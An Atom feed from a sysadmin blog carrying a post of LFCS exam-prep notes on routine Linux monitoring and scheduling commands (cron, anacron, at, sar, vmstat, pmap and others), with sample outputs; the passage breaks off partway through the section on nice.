<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-02-27T14:25:23-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Operation of running systems]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/27/lfcs-prep-operation-of-running-systems/"/>
    <updated>2018-02-27T12:54:56-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/27/lfcs-prep-operation-of-running-systems</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS Operation of Running Systems domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/os1.png" title="linux cmds" alt="linux operation"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/os2.png" title="linux cmds" alt="linux operation"></p>

<ul>
<li>systemd-analyze</li>
</ul>


<blockquote><p>Analyze system boot-up performance</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemd-analyze
</span><span class='line'>Startup finished in 403ms (kernel) + 1.517s (initrd) + 37.584s (userspace) = 39.505s</span></code></pre></td></tr></table></div></figure>


<h4>crontab</h4>

<blockquote><p> maintains crontab files for individual users</p>

<p>Crontab  is the program used to install, remove or list the tables used to serve the
cron(8) daemon.  Each user can have their own crontab, and though  these  are  files
in  /var/spool/, they are not intended to be edited directly</p></blockquote>

<ul>
<li>format of crontab entry</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crontab
</span><span class='line'>SHELL=/bin/bash
</span><span class='line'>PATH=/sbin:/bin:/usr/sbin:/usr/bin
</span><span class='line'>MAILTO=root
</span><span class='line'>
</span><span class='line'># For details see man 4 crontabs
</span><span class='line'>
</span><span class='line'># Example of job definition:
</span><span class='line'># .---------------- minute (0 - 59)
</span><span class='line'># |  .------------- hour (0 - 23)
</span><span class='line'># |  |  .---------- day of month (1 - 31)
</span><span class='line'># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
</span><span class='line'># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
</span><span class='line'># |  |  |  |  |
</span><span class='line'># *  *  *  *  * user-name  command to be executed</span></code></pre></td></tr></table></div></figure>


<ul>
<li>run uptime as root every minute, hour, day of month, month, on weekdays</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crontab -e
</span><span class='line'>* * * * 1-5 uptime &gt;&gt; /root/log.txt</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have new mail in /var/spool/mail/root
</span><span class='line'>[root@tron ~]# mail
</span><span class='line'>Heirloom Mail version 12.5 7/5/10.  Type ? for help.
</span><span class='line'>"/var/spool/mail/root": 4 messages 4 new
</span><span class='line'>&gt;N  1 (Cron Daemon)         Mon Oct  9 14:10  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  2 (Cron Daemon)         Mon Oct  9 14:11  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  3 (Cron Daemon)         Mon Oct  9 14:12  25/850   "Cron &lt;root@tron&gt; root"
</span><span class='line'> N  4 (Cron Daemon)         Mon Oct  9 14:13  25/850   "Cron &lt;root@tron&gt; root"</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat log.txt
</span><span class='line'> 14:29:02 up  1:03,  3 users,  load average: 0.01, 0.09, 0.12
</span><span class='line'> 14:30:01 up  1:04,  3 users,  load average: 0.39, 0.24, 0.18</span></code></pre></td></tr></table></div></figure>


<h4>anacron</h4>

<blockquote><p>runs commands periodically</p>

<p>Unlike cron(8), it does not assume that the machine is  running  continuously. <br/>
Hence, it can be used on machines that are not running 24 hours a day to control
regular jobs  as  daily,  weekly, and monthly jobs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> cat /etc/anacrontab
</span><span class='line'> # /etc/anacrontab: configuration file for anacron
</span><span class='line'> 
</span><span class='line'> # See anacron(8) and anacrontab(5) for details.
</span><span class='line'> 
</span><span class='line'> SHELL=/bin/sh
</span><span class='line'> PATH=/sbin:/bin:/usr/sbin:/usr/bin
</span><span class='line'> MAILTO=root
</span><span class='line'> # the maximal random delay added to the base delay of the jobs
</span><span class='line'> RANDOM_DELAY=45
</span><span class='line'> # the jobs will be started during the following hours only
</span><span class='line'> START_HOURS_RANGE=3-22
</span><span class='line'> 
</span><span class='line'> #period in days   delay in minutes   job-identifier   command
</span><span class='line'> 1    5   cron.daily      nice run-parts /etc/cron.daily
</span><span class='line'> 7    25  cron.weekly     nice run-parts /etc/cron.weekly
</span><span class='line'> @monthly 45  cron.monthly        nice run-parts /etc/cron.monthly</span></code></pre></td></tr></table></div></figure>


<ul>
<li>anacron job</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1 1 demo netstat -lnt &gt; /root/conn.txt</span></code></pre></td></tr></table></div></figure>


<p>Check validity of job file with <code>anacron -T</code></p>

<h4>at</h4>

<blockquote><p>executes commands at a specified time</p></blockquote>

<ul>
<li>schedule job and use Ctrl-D at the prompt when you&rsquo;re done</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> at 19:08 oct 09
</span><span class='line'> at&gt; netstat -lnt &gt; /root/ports.txt
</span><span class='line'> at&gt; &lt;EOT&gt;
</span><span class='line'> job 3 at Mon Oct  9 19:08:00 2017</span></code></pre></td></tr></table></div></figure>


<h4>atq</h4>

<blockquote><p>lists  the  user&rsquo;s  pending  jobs, unless the user is the superuser; in that case,
everybody&rsquo;s jobs are listed.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> [root@tron ~]# atq
</span><span class='line'> 3    Mon Oct  9 19:08:00 2017 a root</span></code></pre></td></tr></table></div></figure>


<h4>ldd</h4>

<blockquote><p>print shared library dependencies</p>

<p>In the usual  case,  ldd  invokes  the  standard  dynamic  linker  (see ld.so(8))<br/>
with the LD_TRACE_LOADED_OBJECTS environment variable set to 1, which causes the
linker to display  the  library  dependencies.   Be aware,  > however,  that  in some
circumstances, some versions of ldd may attempt to obtain the dependency information
by directly executing  the program.  Thus, you should never employ ldd on an untrusted
executable, since this may result in the execution  of  arbitrary  code.   A  safer
alternative when dealing with untrusted executables is:</p>

<p>$ objdump -p /path/to/program | grep NEEDED</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ldd /usr/bin/bash
</span><span class='line'>  linux-vdso.so.1 =&gt;  (0x00007fff62b20000)
</span><span class='line'>  libtinfo.so.5 =&gt; /lib64/libtinfo.so.5 (0x00007ff06afba000)
</span><span class='line'>  libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007ff06adb6000)
</span><span class='line'>  libc.so.6 =&gt; /lib64/libc.so.6 (0x00007ff06a9f4000)
</span><span class='line'>  /lib64/ld-linux-x86-64.so.2 (0x00007ff06b1f9000)</span></code></pre></td></tr></table></div></figure>


<h4>sar</h4>

<blockquote><p>Collect, report, or save system activity information</p></blockquote>

<ul>
<li>CPU activity</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sar
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 03:57:29 PM       LINUX RESTART
</span><span class='line'> 
</span><span class='line'> 04:00:01 PM     CPU     %user     %nice   %system   %iowait    %steal     %idle
</span><span class='line'> 04:10:01 PM     all      2.66      0.00      1.02      0.15      0.00     96.17
</span><span class='line'> 04:20:01 PM     all      2.64      0.00      0.83      0.01      0.00     96.52
</span><span class='line'> 04:30:01 PM     all      0.65      0.03      0.94      0.09      0.00     98.28
</span><span class='line'> 04:40:01 PM     all      0.35      0.00      0.20      0.00      0.00     99.45
</span><span class='line'> 04:50:01 PM     all      0.25      0.00      0.14      0.00      0.00     99.60
</span><span class='line'> 05:00:01 PM     all      0.24      0.00      0.17      0.00      0.00     99.58
</span><span class='line'> 05:10:01 PM     all      0.24      0.00      0.17      0.00      0.00     99.59
</span><span class='line'> 05:20:01 PM     all      0.35      0.00      0.20      0.00      0.00     99.45
</span><span class='line'> 05:30:01 PM     all      0.40      0.00      0.24      0.00      0.00     99.36
</span><span class='line'> 05:40:01 PM     all      0.51      0.00      0.21      0.00      0.00     99.27
</span><span class='line'> 05:50:01 PM     all      5.88      0.00      1.51      0.02      0.00     92.59
</span><span class='line'> 06:00:02 PM     all      0.48      0.00      0.25      0.00      0.00     99.27
</span><span class='line'> 06:10:01 PM     all      0.16      0.00      0.19      0.00      0.00     99.65
</span><span class='line'> 06:20:01 PM     all      2.16      0.00      0.59      0.01      0.00     97.25
</span><span class='line'> 06:30:01 PM     all      2.94      0.00      0.69      0.00      0.00     96.37
</span><span class='line'> 06:40:01 PM     all      0.10      0.00      0.18      0.00      0.00     99.72
</span><span class='line'> 06:50:01 PM     all      0.11      0.00      0.13      0.00      0.00     99.76
</span><span class='line'> 07:00:02 PM     all      0.17      0.00      0.21      0.00      0.00     99.62
</span><span class='line'> 07:10:01 PM     all      0.10      0.00      0.15      0.00      0.00     99.76
</span><span class='line'> 07:20:01 PM     all      0.10      0.00      0.14      0.00      0.00     99.76
</span><span class='line'> 07:30:01 PM     all      0.14      0.00      0.16      0.00      0.00     99.70
</span><span class='line'> 07:40:02 PM     all      0.10      0.00      0.14      0.00      0.00     99.76
</span><span class='line'> 
</span><span class='line'> 07:40:02 PM     CPU     %user     %nice   %system   %iowait    %steal     %idle
</span><span class='line'> 07:50:01 PM     all      0.09      0.00      0.15      0.00      0.00     99.75
</span><span class='line'> 08:00:01 PM     all      0.19      0.00      0.26      0.00      0.00     99.55
</span><span class='line'> 08:10:01 PM     all      0.44      0.00      0.22      0.00      0.00     99.34
</span><span class='line'> Average:        all      0.84      0.00      0.36      0.01      0.00     98.78</span></code></pre></td></tr></table></div></figure>


<ul>
<li>memory statistics</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> sar -r
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 03:57:29 PM       LINUX RESTART
</span><span class='line'> 
</span><span class='line'> 04:00:01 PM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty
</span><span class='line'> 04:10:01 PM    889804    994304     52.77      1004    382376   2556680     64.22    522128    294044        12
</span><span class='line'> 04:20:01 PM    890844    993264     52.72      1004    382456   2556872     64.22    521256    294004         4
</span><span class='line'> 04:30:01 PM    802736   1081372     57.39      1004    387280   2557724     64.24    524088    296556         0
</span><span class='line'> 04:40:01 PM    802744   1081364     57.39      1004    387320   2557724     64.24    524120    296564        12
</span><span class='line'> 04:50:01 PM    802712   1081396     57.40      1004    387296   2557724     64.24    524096    296556         0
</span><span class='line'> 05:00:01 PM    802640   1081468     57.40      1004    387304   2582312     64.86    524252    296544         8
</span><span class='line'> 05:10:01 PM    803032   1081076     57.38      1004    387288   2581776     64.85    524048    296516         0
</span><span class='line'> 05:20:01 PM    798948   1085160     57.60      1004    387288   2581776     64.85    528108    296516         0
</span><span class='line'> 05:30:01 PM    798808   1085300     57.60      1004    387312   2581776     64.85    528156    296524        20
</span><span class='line'> 05:40:01 PM    798552   1085556     57.62      1004    387344   2581720     64.85    528424    296520         0
</span><span class='line'> 05:50:01 PM    773308   1110800     58.96      1004    388048   2605656     65.45    553040    297056         0
</span><span class='line'> 06:00:02 PM    773116   1110992     58.97      1004    388056   2605656     65.45    553196    297056         0
</span><span class='line'> 06:10:01 PM    770812   1113296     59.09      1004    388564   2605664     65.45    554944    297556         0
</span><span class='line'> 06:20:01 PM    733504   1150604     61.07      1004    388708   2642264     66.37    592036    297640         0
</span><span class='line'> 06:30:01 PM    732720   1151388     61.11      1004    388852   2642544     66.37    592928    297552         0
</span><span class='line'> 06:40:01 PM    732732   1151376     61.11      1004    388884   2642608     66.38    592956    297556         8
</span><span class='line'> 06:50:01 PM    732640   1151468     61.11      1004    388864   2642608     66.38    592948    297556         0
</span><span class='line'> 07:00:02 PM    732616   1151492     61.12      1004    388872   2642608     66.38    593060    297496         0
</span><span class='line'> 07:10:01 PM    732512   1151596     61.12      1004    388880   2642608     66.38    593120    297496         0
</span><span class='line'> 07:20:01 PM    732536   1151572     61.12      1004    388888   2642608     66.38    593324    297320         0
</span><span class='line'> 07:30:01 PM    732452   1151656     61.12      1004    388896   2642608     66.38    593348    297320         0
</span><span class='line'> 07:40:02 PM    732424   1151684     61.13      1004    388924   2642608     66.38    593364    297324         4
</span><span class='line'> 
</span><span class='line'> 07:40:02 PM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty
</span><span class='line'> 07:50:01 PM    732388   1151720     61.13      1004    388908   2642608     66.38    593376    297320         0
</span><span class='line'> 08:00:01 PM    732444   1151664     61.13      1004    388956   2642608     66.38    594632    296136         8
</span><span class='line'> 08:10:01 PM    752844   1131264     60.04      1004    388988   2621972     65.86    574028    296148         0
</span><span class='line'> Average:       772795   1111313     58.98      1004    387782   2608132     65.51    560359    296755         3</span></code></pre></td></tr></table></div></figure>


<h4>iostat</h4>

<blockquote><p>report CPU statistics and input/output statistics for devices and partitions.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> iostat
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> avg-cpu:  %user   %nice %system %iowait  %steal   %idle
</span><span class='line'>            1.41    0.01    0.76    0.20    0.00   97.61
</span><span class='line'> 
</span><span class='line'> Device:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn
</span><span class='line'> sda               2.09        54.42         6.10     452565      50723
</span><span class='line'> dm-0              1.85        50.73         5.85     421879      48655
</span><span class='line'> dm-1              0.02         0.13         0.00       1068          0</span></code></pre></td></tr></table></div></figure>


<h4>pidstat</h4>

<blockquote><p>Report statistics for Linux tasks</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pidstat -p 3381
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 06:20:21 PM   UID       PID    %usr %system  %guest    %CPU   CPU  Command</span></code></pre></td></tr></table></div></figure>


<h4>mpstat</h4>

<blockquote><p>Report processors related statistics</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> mpstat
</span><span class='line'> Linux 3.10.0-514.26.2.el7.x86_64 (tron)  10/05/2017  _x86_64_    (1 CPU)
</span><span class='line'> 
</span><span class='line'> 06:23:38 PM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
</span><span class='line'> 06:23:38 PM  all    1.59    0.01    0.76    0.20    0.00    0.02    0.00    0.00    0.00   97.42</span></code></pre></td></tr></table></div></figure>


<h4>vmstat</h4>

<blockquote><p>Report virtual memory statistics</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> vmstat
</span><span class='line'> procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
</span><span class='line'>  r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
</span><span class='line'>  4  0      0 776148   1004 503192    0    0    70     8   79  169  2  1 97  0  0</span></code></pre></td></tr></table></div></figure>


<h4>tload</h4>

<blockquote><p>graphic representation of system load average</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> 0.01, 0.07, 0.17</span></code></pre></td></tr></table></div></figure>


<h4>watch</h4>

<blockquote><p>execute a program periodically, showing output fullscreen</p></blockquote>

<h4>lscpu</h4>

<blockquote><p>display information about the CPU architecture</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lscpu
</span><span class='line'> Architecture:          x86_64
</span><span class='line'> CPU op-mode(s):        32-bit, 64-bit
</span><span class='line'> Byte Order:            Little Endian
</span><span class='line'> CPU(s):                1
</span><span class='line'> On-line CPU(s) list:   0
</span><span class='line'> Thread(s) per core:    1
</span><span class='line'> Core(s) per socket:    1
</span><span class='line'> Socket(s):             1
</span><span class='line'> NUMA node(s):          1
</span><span class='line'> Vendor ID:             GenuineIntel
</span><span class='line'> CPU family:            6
</span><span class='line'> Model:                 69
</span><span class='line'> Model name:            Intel(R) Core(TM) i5-4300U CPU @ 1.90GHz
</span><span class='line'> Stepping:              1
</span><span class='line'> CPU MHz:               2493.585
</span><span class='line'> BogoMIPS:              4988.45
</span><span class='line'> Hypervisor vendor:     VMware
</span><span class='line'> Virtualization type:   full
</span><span class='line'> L1d cache:             32K
</span><span class='line'> L1i cache:             32K
</span><span class='line'> L2 cache:              256K
</span><span class='line'> L3 cache:              3072K
</span><span class='line'> NUMA node0 CPU(s):     0</span></code></pre></td></tr></table></div></figure>


<h4>uptime</h4>

<blockquote><p>Tell how long the system has been running</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> uptime
</span><span class='line'>  16:11:48 up 14 min,  3 users,  load average: 0.06, 0.20, 0.28</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show since when is the system up</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> uptime -s
</span><span class='line'> 2017-10-05 15:57:10</span></code></pre></td></tr></table></div></figure>


<h4>pmap</h4>

<blockquote><p>report memory map of a process</p></blockquote>

<ul>
<li>-p # Show full path to files in the mapping column</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pmap -p $$
</span><span class='line'> 3425:   bash
</span><span class='line'> 0000000000400000    884K r-x-- /usr/bin/bash
</span><span class='line'> 00000000006dc000      4K r---- /usr/bin/bash
</span><span class='line'> 00000000006dd000     36K rw--- /usr/bin/bash
</span><span class='line'> 00000000006e6000     24K rw---   [ anon ]
</span><span class='line'> 0000000000cbc000   1572K rw---   [ anon ]
</span><span class='line'> 00007f1b843d1000     48K r-x-- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b843dd000   2044K ----- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845dc000      4K r---- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845dd000      4K rw--- /usr/lib64/libnss_files-2.17.so
</span><span class='line'> 00007f1b845de000     24K rw---   [ anon ]
</span><span class='line'> 00007f1b845e4000 103588K r---- /usr/lib/locale/locale-archive
</span><span class='line'> 00007f1b8ab0d000   1756K r-x-- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8acc4000   2044K ----- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec3000     16K r---- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec7000      8K rw--- /usr/lib64/libc-2.17.so
</span><span class='line'> 00007f1b8aec9000     20K rw---   [ anon ]
</span><span class='line'> 00007f1b8aece000      8K r-x-- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8aed0000   2048K ----- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d0000      4K r---- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d1000      4K rw--- /usr/lib64/libdl-2.17.so
</span><span class='line'> 00007f1b8b0d2000    148K r-x-- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b0f7000   2048K ----- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2f7000     16K r---- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2fb000      4K rw--- /usr/lib64/libtinfo.so.5.9
</span><span class='line'> 00007f1b8b2fc000    128K r-x-- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b504000     12K rw---   [ anon ]
</span><span class='line'> 00007f1b8b512000      8K rw---   [ anon ]
</span><span class='line'> 00007f1b8b514000     28K r--s- /usr/lib64/gconv/gconv-modules.cache
</span><span class='line'> 00007f1b8b51b000      4K rw---   [ anon ]
</span><span class='line'> 00007f1b8b51c000      4K r---- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b51d000      4K rw--- /usr/lib64/ld-2.17.so
</span><span class='line'> 00007f1b8b51e000      4K rw---   [ anon ]
</span><span class='line'> 00007ffeb5ec8000    132K rw---   [ stack ]
</span><span class='line'> 00007ffeb5efc000      8K r-x--   [ anon ]
</span><span class='line'> ffffffffff600000      4K r-x--   [ anon ]
</span><span class='line'>  total           116692K</span></code></pre></td></tr></table></div></figure>


<h4>pwdx</h4>

<blockquote><p>report current working directory of a process</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> pwdx $$
</span><span class='line'> 3425: /root</span></code></pre></td></tr></table></div></figure>


<h4>free</h4>

<blockquote><p>Display amount of free and used memory in the system</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> free -h
</span><span class='line'>               total        used        free      shared  buff/cache   available
</span><span class='line'> Mem:           1.8G        509M        883M         10M        446M        1.1G
</span><span class='line'> Swap:          2.0G          0B        2.0G</span></code></pre></td></tr></table></div></figure>


<h4>nice</h4>

<blockquote><p>run a program with modified scheduling priority</p></blockquote>

<p> Niceness  values range  from  -20 (most favorable to the process) to 19 (least favorable to the process).</p>

<ul>
<li>-n # add integer N to the niceness (default 10)</li>
